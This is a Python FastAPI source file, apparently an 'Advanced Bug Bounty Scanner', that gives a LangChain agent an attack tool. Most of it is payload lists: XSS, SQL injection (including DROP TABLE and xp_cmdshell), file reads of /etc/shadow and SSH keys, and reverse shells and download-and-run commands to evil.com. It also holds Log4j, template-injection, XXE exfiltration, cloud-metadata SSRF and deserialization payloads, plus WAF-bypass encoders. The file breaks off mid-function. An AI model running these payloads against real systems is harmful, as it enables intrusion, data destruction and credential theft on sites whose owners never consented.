import os
import uvicorn
import logging
from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, Header
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field, validator
from dotenv import load_dotenv
from typing import Optional, List, Dict, Any
import asyncio
import httpx
import re
import random
import json
from urllib.parse import quote_plus, unquote
from contextlib import asynccontextmanager
import traceback
import ipaddress
import socket

# --- Security helpers ---
def _resolve_ip(host: str):
    try:
        infos = socket.getaddrinfo(host, None)
        ips = {info[4][0] for info in infos}
        return [ipaddress.ip_address(ip) for ip in ips]
    except Exception:
        return []

def is_blocked_ip(ip: "ipaddress.IPv4Address | ipaddress.IPv6Address") -> bool:
    # RFC1918, loopback, link-local, unique-local, multicast, unspecified + metadata ranges
    private = ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast or ip.is_unspecified
    # AWS/GCP metadata IPs
    metadata_ips = {"169.254.169.254"}
    return private or str(ip) in metadata_ips

def validate_outbound_url(target_url: str) -> None:
    from urllib.parse import urlparse
    if not target_url or not target_url.startswith(("http://", "https://")):
        raise HTTPException(status_code=400, detail="Invalid URL")
    parsed = urlparse(target_url)
    ips = _resolve_ip(parsed.hostname)
    if not ips:
        return
    for ip in ips:
        if is_blocked_ip(ip):
            raise HTTPException(status_code=400, detail="Outbound to private/metadata addresses is blocked")

def require_api_key(x_api_key: str | None) -> None:
    required = os.getenv("API_KEY")
    if not required:
        # locked-down default: require key; if not set, block
        raise HTTPException(status_code=503, detail="Server not configured: set API_KEY env var")
    if x_api_key != required:
        raise HTTPException(status_code=401, detail="Invalid API key")

from datetime import datetime
import base64
import hashlib
import time

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory

# --- 設定クラス ---
class Config:
    def __init__(self):
        load_dotenv()
        self.port = int(os.getenv("PORT", 8000))
        self.host = os.getenv("HOST", "0.0.0.0")
        self.timeout = int(os.getenv("REQUEST_TIMEOUT", 30))
        self.max_retries = int(os.getenv("MAX_RETRIES", 3))
        self.log_level = os.getenv("LOG_LEVEL", "INFO")
        self.google_api_key = os.getenv("GOOGLE_API_KEY")
        
        if not self.google_api_key:
            logging.warning("GOOGLE_API_KEY not set. LLM analysis will be disabled.")

config = Config()

# --- ロギング設定 ---
logging.basicConfig(
    level=getattr(logging, config.log_level),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
)
logger = logging.getLogger(__name__)

# --- FastAPI設定 ---
app = FastAPI(title="Advanced Bug Bounty Scanner", version="3.0.0")
router = APIRouter()

# --- 高度なWAFバイパス手法 ---
def apply_advanced_waf_bypass(payload: str, technique: str) -> str:
    """高度なWAFバイパス手法を適用"""
    try:
        if technique == "case_obfuscation":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        elif technique == "url_encoding":
            return quote_plus(payload)
        elif technique == "double_url_encoding":
            return quote_plus(quote_plus(payload))
        elif technique == "unicode_encoding":
            return payload.replace("'", "\u0027").replace('"', "\u0022").replace("<", "\u003C").replace(">", "\u003E")
        elif technique == "html_encoding":
            return payload.replace("<", "&lt;").replace(">", "&gt;").replace("'", "&#39;").replace('"', "&quot;")
        elif technique == "mixed_case":
            result = ""
            for i, char in enumerate(payload):
                if char.isalpha():
                    result += char.upper() if i % 2 == 0 else char.lower()
                else:
                    result += char
            return result
        elif technique == "comment_insertion":
            return payload.replace(" ", "/**/ ").replace("=", "/**/=/**/").replace("'", "/*'*/'")
        elif technique == "null_byte_insertion":
            return payload.replace("'", "%00'").replace('"', '%00"')
        elif technique == "tab_newline":
            return payload.replace(" ", "%09").replace("=", "%0A=")
        elif technique == "concatenation":
            if "'" in payload:
                return payload.replace("'", "''||''")
            return payload
        elif technique == "hex_encoding":
            return "0x" + payload.encode('utf-8').hex()
        elif technique == "base64_encoding":
            return base64.b64encode(payload.encode()).decode()
        return payload
    except Exception as e:
        logger.error(f"WAFバイパス適用エラー: {e}")
        return payload

# --- 高度な攻撃ペイロード生成 ---
def generate_advanced_xss_payloads() -> List[str]:
    """高度なXSS攻撃ペイロード"""
    return [
        # 基本的なXSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS');",
        
        # DOM-based XSS
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<svg/onload=setTimeout`alert\x28'XSS'\x29`,0>",
        
        # Filter bypass
        "<SCript>alert('XSS')</SCript>",
        "<script\x20type=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x09type=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
        "<script\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
        
        # Event handlers
        "<body onload='alert(\"XSS\")'>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        
        # CSS-based XSS
        "<style>@import'javascript:alert(\"XSS\")';</style>",
        "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
        "<style>body{-moz-binding:url(\"javascript:alert('XSS')\")}",
        
        # XML-based XSS
        "<html xmlns:xss><?import namespace=\"xss\" implementation=\"/tmp/xss.htc\"><xss:xss>XSS</xss:xss></html>",
        
        # Advanced bypasses
        "<iframe src=\"javascript:alert(`XSS`)\">",
        "<object data=\"javascript:alert('XSS')\">",
        "<embed src=\"javascript:alert('XSS')\">",
        "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert('XSS') src=x>",
        
        # Context-breaking
        "\";alert('XSS');//",
        "';alert('XSS');//",
        "</script><script>alert('XSS')</script>",
        "</title><script>alert('XSS')</script>",
        
        # Polyglot XSS
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        
        # Template injection XSS
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        
        # WebAssembly XSS
        "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])).then(module => { module.instance.exports.main(); alert('XSS'); });</script>"
    ]

def generate_advanced_sqli_payloads() -> List[str]:
    """高度なSQL Injection ペイロード"""
    return [
        # Union-based
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' UNION SELECT @@version,@@hostname,@@datadir--",
        "' UNION SELECT user(),database(),version()--",
        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
        
        # Boolean-based blind
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT LENGTH(database()))>5--",
        "' AND SUBSTRING(user(),1,1)='r'--",
        
        # Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT SLEEP(5))--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
        "'; SELECT pg_sleep(5)--",
        
        # Error-based
        "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
        "' AND updatexml(null,concat(0x0a,version()),null)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))--",
        
        # Second-order SQL injection
        "admin'/**/UNION/**/SELECT/**/NULL,NULL,NULL#",
        "admin' OR 1=1 LIMIT 1 OFFSET 1#",
        
        # NoSQL injection
        "[$ne]=null",
        "[$regex]=.*",
        "[$where]=function(){return true}",
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        
        # Advanced bypasses
        "' /*!UNION*/ /*!SELECT*/ NULL,NULL,NULL--",
        "' /*! UNION SELECT */ NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,CONCAT(0x3a,0x3a,0x3a),NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin','5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8','salt'--",
        
        # Stacked queries
        "'; INSERT INTO users VALUES ('hacker','password')--",
        "'; CREATE TABLE test (id INT)--",
        "'; DROP TABLE users--",
        
        # HQL/ORM injection
        "' OR '1'='1' ORDER BY 1--",
        "' GROUP BY 1 HAVING 1=1--",
        "' AND 1=1) AND ('1'='1",
        
        # PostgreSQL specific
        "'; COPY (SELECT '') TO PROGRAM 'id'--",
        "' AND (SELECT version()) LIKE '%PostgreSQL%'--",
        
        # MySQL specific
        "' AND @@version LIKE '5%'--",
        "' PROCEDURE ANALYSE(EXTRACTVALUE(RAND(),CONCAT(0x3a,VERSION())),1)--",
        
        # MSSQL specific
        "'; EXEC xp_cmdshell('id')--",
        "' AND @@version LIKE '%Microsoft%'--",
        
        # Oracle specific
        "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--",
        "' UNION SELECT NULL,NULL,NULL FROM dual--"
    ]

def generate_advanced_lfi_payloads() -> List[str]:
    """高度なLFI攻撃ペイロード"""
    return [
        # 基本的なLFI
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../../etc/group",
        
        # Windows LFI
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        
        # Null byte bypass
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        
        # URL encoding bypass
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        
        # UTF-8 encoding
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%e0%80%af..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
        
        # Filter bypasses
        "....//....//....//....//etc/passwd",
        "..///////..////..//////etc/passwd",
        "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
        
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
        "data://text/plain,<?php system($_GET[c]); ?>",
        
        # Log poisoning
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/apache/access.log",
        "../../../../var/log/nginx/access.log",
        "../../../../var/log/httpd/access_log",
        
        # Proc filesystem
        "../../../../proc/self/environ",
        "../../../../proc/self/cmdline",
        "../../../../proc/self/stat",
        "../../../../proc/version",
        "../../../../proc/self/fd/0",
        "../../../../proc/self/fd/1",
        "../../../../proc/self/fd/2",
        
        # SSH files
        "../../../../home/user/.ssh/id_rsa",
        "../../../../root/.ssh/id_rsa",
        "../../../../home/user/.ssh/authorized_keys",
        
        # Configuration files
        "../../../../etc/apache2/apache2.conf",
        "../../../../etc/nginx/nginx.conf",
        "../../../../etc/mysql/my.cnf",
        "../../../../etc/httpd/conf/httpd.conf",
        
        # Application files
        "../../../../var/www/html/config.php",
        "../../../../var/www/html/.env",
        "../../../../opt/lampp/etc/httpd.conf",
        
        # Zip wrapper
        "zip://path/to/file.zip%23dir/file.txt",
        
        # FTP wrapper
        "ftp://user:pass@host/file.txt",
        
        # Expect wrapper
        "expect://id",
        
        # Input wrapper
        "php://input",
        
        # Advanced techniques
        "....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
        "..%c1%1c..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd",
        
        # Remote file inclusion attempts
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/malicious",
        "ftp://anonymous@evil.com/shell.txt"
    ]

def generate_advanced_rce_payloads() -> List[str]:
    """高度なRCE攻撃ペイロード"""
    return [
        # 基本的なコマンドインジェクション
        ";id;",
        "|id|",
        "`id`",
        "$(id)",
        "&id&",
        "&&id",
        "||id",
        
        # 高度なバイパス
        ";i\\d;",
        ";/bin/i\\d;",
        ";/usr/bin/i\\d;",
        "$(($0)i\\d)",
        
        # 時間遅延
        ";sleep 5;",
        "|sleep 5|",
        "`sleep 5`",
        "$(sleep 5)",
        ";ping -c 10 127.0.0.1;",
        
        # ファイル操作
        ";cat /etc/passwd;",
        "|cat /etc/passwd|",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        ";ls -la /;",
        ";find / -name '*.conf' 2>/dev/null;",
        
        # ネットワーク系
        ";wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh;",
        ";curl http://evil.com/shell.py | python;",
        ";nc -e /bin/bash evil.com 4444;",
        
        # PowerShell (Windows)
        ";powershell -Command \"Get-Process\";",
        ";powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==;",
        
        # Python code execution
        "__import__('os').system('id')",
        "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))",
        
        # Node.js code execution
        "require('child_process').exec('id')",
        "global.process.mainModule.require('child_process').exec('id')",
        
        # Java code execution
        "Runtime.getRuntime().exec(\"id\")",
        "new ProcessBuilder(\"id\").start()",
        
        # PHP code execution
        "system('id')",
        "exec('id')",
        "shell_exec('id')",
        "passthru('id')",
        "eval('system(\"id\");')",
        
        # Expression Language injection
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        
        # OGNL injection
        "@java.lang.Runtime@getRuntime().exec('id')",
        "(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())",
        
        # Shellshock
        "() { :; }; echo vulnerable",
        "() { :; }; /bin/bash -c 'echo vulnerable'",
        
        # Log4j
        "${jndi:ldap://evil.com/exploit}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
        
        # Template injection
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{config.__class__.__init__.__globals__['os'].environ}}",
        
        # Deserialization
        "O:8:\"stdClass\":1:{s:4:\"test\";s:3:\"RCE\";}",
        
        # SSTI various engines
        "#{7*7}",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        
        # Command substitution bypasses
        "i\\d",
        "/bin/i''d",
        "/bin/i\"\"d",
        "/bin/i\\x64",
        "$(printf '\\151\\144')",
        "`printf '\\151\\144'`",
        
        # Environment variable bypass
        "$0",
        "${IFS}",
        "${PATH:0:1}",
        "${HOME:0:1}",
        
        # Hex/Octal encoding
        "$(echo -e '\\x69\\x64')",
        "$(echo -e '\\151\\144')",
        
        # Base64 bypass
        "$(echo aWQ= | base64 -d)",
        "`echo aWQ= | base64 -d`"
    ]

def generate_advanced_ssti_payloads() -> List[str]:
    """高度なSSTI攻撃ペイロード"""
    return [
        # Jinja2 (Python)
        "{{7*7}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        
        # Twig (PHP)
        "{{7*7}}",
        "{{_self}}",
        "{{_self.env}}",
        "{{_self.env.getExtension('Twig_Extension_Core')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /etc/passwd']|filter('system')}}",
        
        # Smarty (PHP)
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php eval($_GET[1]); ?>',false)}",
        "{system('id')}",
        "{if phpinfo()}{/if}",
        
        # Freemarker (Java)
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "${'freemarker.template.utility.Execute'?new()('id')}",
        "<#assign classloader=article.class.protectionDomain.classLoader>\n<#assign owc=classloader.loadClass('freemarker.template.utility.ObjectWrapper')>\n<#assign dwf=owc.getField('DEFAULT_WRAPPER').get(null)>\n<#assign ec=classloader.loadClass('freemarker.template.utility.Execute')>\n${dwf.newInstance(ec,null)('id')}",
        
        # Velocity (Java)
        "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$chr.toString($out.read())#end",
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
        
        # Handlebars (Node.js)
        "{{#with 'constructor' as |c|}}{{#with (lookup this c) as |o|}}{{#with (lookup o 'constructor') as |f|}}{{f 'return process.env'}}(){{/f}}{{/o}}{{/c}}{{/with}}",
        "{{#with (lookup (lookup this 'constructor') 'constructor') as |c|}}{{c 'return process.env'}}(){{/c}}{{/with}}",
        
        # Mustache
        "{{#lambda}}{{/lambda}}",
        
        # Pug (Node.js)
        "#{7*7}",
        "#{global.process.mainModule.require('child_process').execSync('id')}",
        "#{root.process.mainModule.require('child_process').execSync('id')}",
        
        # ERB (Ruby)
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= File.open('/etc/passwd').read %>",
        
        # Go templates
        "{{.}}",
        "{{printf \"%s\" \"id\" | .}}",
        
        # Tornado (Python)
        "{{7*7}}",
        "{% import os %}{{os.system('id')}}",
        "{% import subprocess %}{{subprocess.check_output('id',shell=True)}}",
        
        # Django (Python)
        "{{7|mul:7}}",
        "{% load log %}{% get_admin_log 10 as log_entries %}",
        
        # Razor (C#)
        "@(7*7)",
        "@{System.Diagnostics.Process.Start('calc');}",
        "@{var x = new System.Diagnostics.ProcessStartInfo('cmd.exe', '/c id'); x.UseShellExecute = false; x.RedirectStandardOutput = true; var p = System.Diagnostics.Process.Start(x); p.WaitForExit(); Response.Write(p.StandardOutput.ReadToEnd());}",
        
        # Thymeleaf (Java)
        "${7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}",
        
        # Blade (PHP Laravel)
        "{{7*7}}",
        "@php system('id'); @endphp",
        "{!! system('id') !!}",
        
        # Advanced polyglot
        "${{<%[%'\"}}{{7*7}}{{/}}${7*7}#{7*7}${{7*7}}<%=7*7%>${{7*7}}{{7*7}}"
    ]

def generate_advanced_xxe_payloads() -> List[str]:
    """高度なXXE攻撃ペイロード"""
    return [
        # 基本的なXXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
        
        # OOB XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo></foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo></foo>',
        
        # Blind XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/?%xxe;">%dtd;]><foo></foo>',
        
        # Error-based XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % ent "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%ent;%error;]><foo></foo>',
        
        # PHP wrapper XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]><foo>&xxe;</foo>',
        
        # Windows XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        
        # SSRF via XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3306">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        
        # FTP XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com:21/test">]><foo>&xxe;</foo>',
        
        # Jar protocol
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://evil.com/evil.jar!/">]><foo>&xxe;</foo>',
        
        # NetDoc protocol
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>',
        
        # Gopher protocol
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.com:70/1">]><foo>&xxe;</foo>',
        
        # Advanced parameter entity
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://evil.com/parameterEntity.dtd">%dtd;]><foo>&all;</foo>'
    ]

def generate_advanced_nosql_payloads() -> List[str]:
    """NoSQL Injection ペイロード"""
    return [
        # MongoDB
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"$where": "function(){return true}"}',
        '{"$where": "this.username == this.username"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        '{"username": {"$regex": "^admin"}}',
        
        # CouchDB
        '"_design/test/_view/test?startkey=\u0000&endkey=\ufff0"',
        '"_all_docs?include_docs=true"',
        
        # Redis
        'FLUSHDB',
        'EVAL "return {KEYS[1],KEYS[2],ARGV[1],ARGV[2]}" 0',
        'CONFIG GET *',
        
        # Cassandra
        "'; DROP KEYSPACE IF EXISTS test; --",
        "' ALLOW FILTERING; --"
    ]

def generate_advanced_ssrf_payloads() -> List[str]:
    """SSRF攻撃ペイロード"""
    return [
        # 内部ネットワーク
        "http://localhost:22",
        "http://localhost:3306",
        "http://localhost:5432",
        "http://localhost:6379",
        "http://localhost:11211",
        "http://127.0.0.1:8080",
        "http://0.0.0.0:80",
        "http://[::1]:80",
        
        # AWS メタデータ
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        
        # Google Cloud メタデータ
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        
        # Azure メタデータ
        "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
        
        # プロトコルバイパス
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:11211/stat",
        "ftp://127.0.0.1/",
        
        # IPアドレスバイパス
        "http://2130706433/", # 127.0.0.1 in decimal
        "http://0x7f000001/", # 127.0.0.1 in hex
        "http://017700000001/", # 127.0.0.1 in octal
        "http://127.1/",
        "http://0/",
        
        # DNS rebinding
        "http://localtest.me/",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/"
    ]

def generate_deserialization_payloads() -> List[str]:
    """Deserialization攻撃ペイロード"""
    return [
        # Java
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4',
        
        # PHP
        'O:8:"stdClass":1:{s:4:"test";s:3:"RCE";}',
        'a:1:{i:0;O:8:"stdClass":1:{s:4:"test";s:22:"system(\'id\'); echo 1;"}}',
        
        # .NET
        'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA=',
        
        # Python pickle
        "cos\nsystem\n(S'id'\ntR.",
        'c__builtin__\neval\n(S"__import__(\'os\').system(\'id\')"tR.',
        
        # Ruby
        '--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y'
    ]

# --- HTTPクライアント管理 ---
@asynccontextmanager
async def get_http_client():
    """高性能HTTPクライアント"""
    timeout = httpx.Timeout(config.timeout, read=config.timeout*2)
    limits = httpx.Limits(max_keepalive_connections=20, max_connections=100)
    async with httpx.AsyncClient(
        timeout=timeout, 
        limits=limits,
        follow_redirects=True,
        verify=True,
        http2=True  # HTTP/2サポート
    ) as client:
        yield client


# Concurrency & limits
_MAX_REQUESTS_PER_SCAN = int(os.getenv("MAX_REQUESTS_PER_SCAN", "200"))
_concurrency_semaphore = asyncio.Semaphore(int(os.getenv("MAX_CONCURRENCY", "10")))

# --- 高度な脆弱性検出ツール ---
@tool
async def advanced_vulnerability_scanner(
    url: str, 
    method: str = "POST", 
    payload_type: str = "xss", 
    data: str = None, 
    headers: dict = None,
    advanced_mode: bool = True
) -> str:
    """
    高度な脆弱性スキャナー - 複数のWAFバイパス手法と高度な検出機能
    """
    if not url or not url.startswith(('http://', 'https://')):
        return "Error: Invalid URL format"
    try:
        validate_outbound_url(url)
    except HTTPException as e:
        return f"Blocked URL: {e.detail}"
    
    # 高度なWAFバイパス手法
    bypass_techniques = [
        "case_obfuscation", "url_encoding", "double_url_encoding",
        "unicode_encoding", "html_encoding", "mixed_case",
        "comment_insertion", "null_byte_insertion", "tab_newline",
        "concatenation", "hex_encoding", "base64_encoding"
    ]
    
    # 高度なヘッダーセット
    advanced_headers_list = [
        {},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'User-Agent': 'facebookexternalhit/1.1'},
        {'X-Originating-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1', 'X-Remote-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost', 'X-Forwarded-Proto': 'https'},
